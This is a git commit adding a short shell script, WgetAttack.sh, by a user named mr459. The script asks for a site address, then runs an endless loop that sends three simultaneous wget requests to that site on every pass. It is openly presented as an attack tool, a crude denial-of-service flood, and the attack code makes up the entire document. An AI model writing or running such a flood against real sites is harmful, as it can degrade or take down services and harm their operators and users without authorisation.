95f8cb796c551158533d98bdcca58010b27ede35
mr459 <38500081+mr-459@users.noreply.github.com>
2020-04-18 15:20:34 +0430

    Add files via upload

---
+++ WgetAttack.sh
@@ -0,0 +1,12 @@
+echo "created by mr459 in 2016"
+echo "tested on termux & debian"
+echo "version 1.2"
+read -p "site address :    "   site
+echo "running on $site ......."
+echo "starting....."
+echo "press ctrl +c to stop"
+while [ 0==0 ]
+do
+wget $site & wget $site & wget $site
+echo okay
+done
